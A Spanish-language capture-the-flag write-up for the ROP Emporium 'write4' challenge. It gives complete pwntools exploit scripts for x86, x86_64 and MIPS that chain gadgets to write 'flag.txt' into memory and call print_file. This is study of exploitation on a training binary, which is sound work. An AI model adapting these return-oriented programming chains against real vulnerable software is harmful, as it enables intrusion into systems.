# write4

## x86

![2025-05-30-195441_977x295_scrot](https://github.com/user-attachments/assets/7c0bbc01-b019-48c2-ba22-b86b5ede3a71)

En este reto debemos llamar a `print_file` con un puntero a "flag.txt" como argumento. Pero esa cadena no existe en el binario asi que tendremos que escribirla.

La descripcion nos da una pista de gadgets que podriamos usar. Con ROPGadget extraje estos:
```
0x080485aa : pop edi ; pop ebp ; ret
0x08048543 : mov dword ptr [edi], ebp ; ret
```

El primero almacena valores del stack en `edi` y `ebp` y el segundo copia el contenido de `ebp` a la direccion que contiene `edi`.

Necesitamos encontrar tambien una seccion del binario que sea escribible y que no contenga datos importantes. La seccion `data` nos sirve:
```
[0xf7f873a0]> iS ~w
19  0x00000efc    0x4 0x08049efc    0x4 -rw- INIT_ARRAY  .init_array
20  0x00000f00    0x4 0x08049f00    0x4 -rw- FINI_ARRAY  .fini_array
21  0x00000f04   0xf8 0x08049f04   0xf8 -rw- DYNAMIC     .dynamic
22  0x00000ffc    0x4 0x08049ffc    0x4 -rw- PROGBITS    .got
23  0x00001000   0x18 0x0804a000   0x18 -rw- PROGBITS    .got.plt
24  0x00001018    0x8 0x0804a018    0x8 -rw- PROGBITS    .data
25  0x00001020    0x0 0x0804a020    0x4 -rw- NOBITS      .bss
[0xf7f873a0]> px 16@ 0x0804a018
- offset -  1819 1A1B 1C1D 1E1F 2021 2223 2425 2627  89ABCDEF01234567
0x0804a018  0000 0000 0000 0000 0000 0000 0000 0000  ..............
```

Con esto podemos hacer una funcion para escribir alli, en chunks de 4 bytes porque ese es el tamaño de los registros que usamos:
``` python
data_addr = 0x0804a018
gadget_write1 = 0x080485aa  # pop edi ; pop ebp ; ret
gadget_write2 = 0x08048543  # mov dword ptr [edi], ebp ; ret

def write_in_data(data):
    p = b""
    for i in range(0,len(data),4):
        print("Loop: ",i)
        chunk = data[i:i+4].ljust(4,b"\x00")
        p += p32(gadget_write1)
        p += p32(data_addr + i)
        p += p32(int.from_bytes(chunk,'little'))
        p += p32(gadget_write2)
    return p
```

Primero usamos esto para escribir en memoria y luego llamamos a `print_file`, pasandole como argumento el inicio de nuestra cadena.

Exploit:
``` python
from pwn import *
elf = context.binary = ELF("./write432")
io = process("./write432")

data_addr = 0x0804a018
gadget_write1 = 0x080485aa  # pop edi ; pop ebp ; ret
gadget_write2 = 0x08048543  # mov dword ptr [edi], ebp ; ret

def write_in_data(data):
    p = b""
    for i in range(0,len(data),4):
        print("Loop: ",i)
        chunk = data[i:i+4].ljust(4,b"\x00")
        p += p32(gadget_write1)
        p += p32(data_addr + i)
        p += p32(int.from_bytes(chunk,'little'))
        p += p32(gadget_write2)
    return p

payload = b"A" * 44
payload += write_in_data(b"flag.txt\x00")  # write "flag.txt" en .data
payload += p32(elf.plt['print_file'])  # print_file("flag.txt")
payload += p32(0)                      # ebp
payload += p32(data_addr)              # "flag.txt"

io.recv()
io.sendline(payload)
io.interactive()
```

## x86_64

Un poco de lo mismo, solo que usaremos registros de 64 bits para escribir, asi que ajustamos el bucle a chunks de 8 bytes.

Ademas recordemos que en x86_64 primero se almacenan los argumentos en los registros  en el orden de la ABI y despues se llama a la funcion.

Exploit:
``` python
from pwn import *
elf = context.binary = ELF("./write4")
io = process("./write4")

data_addr = 0x00601028
gadget_write1 = 0x00400690  # pop r14 ; pop r15 ; ret
gadget_write2 = 0x00400628  # mov qword ptr [r14], r15 ; ret
pop_rdi =  0x00400693       # pop rdi; ret

def write_in_data(data):
    p = b""
    for i in range(0,len(data),8):
        print("Loop: ",i)
        chunk = data[i:i+8].ljust(8,b"\x00")
        p += p64(gadget_write1)
        p += p64(data_addr + i)                    #r14
        p += p64(int.from_bytes(chunk,'little'))   #r15
        p += p64(gadget_write2)
    return p

payload = b"A" * 40
payload += write_in_data(b"flag.txt\x00")  # write "flag.txt" en .data
payload += p64(pop_rdi)
payload += p64(data_addr)              # "flag.txt"
payload += p64(elf.plt['print_file'])  # print_file("flag.txt")
print(payload)
io.recv()
io.sendline(payload)
io.interactive()
```

## MIPS

En este caso usamos dos gadgets, uno para escribir en memoria secuencialmente y otro para cargar otro gadget distinto dado que no hay una instrucción ret no es tan fácil hacerlo, requiere ajustar un poco los desplazamientos del puntero de pila.

```py
from pwn import *
#io = process("qemu-mipsel -g 1024 -L /usr/mipsel-linux-gnu write4_mipsel",shell=True)
io = process("qemu-mipsel -L /usr/mipsel-linux-gnu write4_mipsel",shell=True)

copy_gadget = 0x00400930 # lw $t9, 0xc($sp); lw $t0, 8($sp); lw $t1, 4($sp); sw $t1, ($t0); jalr $t9; addi $sp, $sp, 0x10;
caller_gadget = 0x00400948 # lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;
print_file_addr = 0x00400a90
bss = 0x00411000

def copy(address: int,data: bytes):
    chain = p32(copy_gadget)
    next = copy_gadget
    for i in range(0,len(data),4):
        if i + 4 >= len(data):
            next = caller_gadget
        chunk = int.from_bytes(data[i:i+4].ljust(4,b"\x00"), "little")
        chain += p32(0)                # + 0
        chain += p32(chunk)            # + 4
        chain += p32(address + i)      # + 8
        chain += p32(next)             # + 0xc
    return chain

payload = b""
payload += b"A"*36
payload += copy(bss,b"flag.txt\x00")
payload += p32(0) + p32(print_file_addr) + p32(bss)
pause()
io.send(payload)
io.interactive()
```

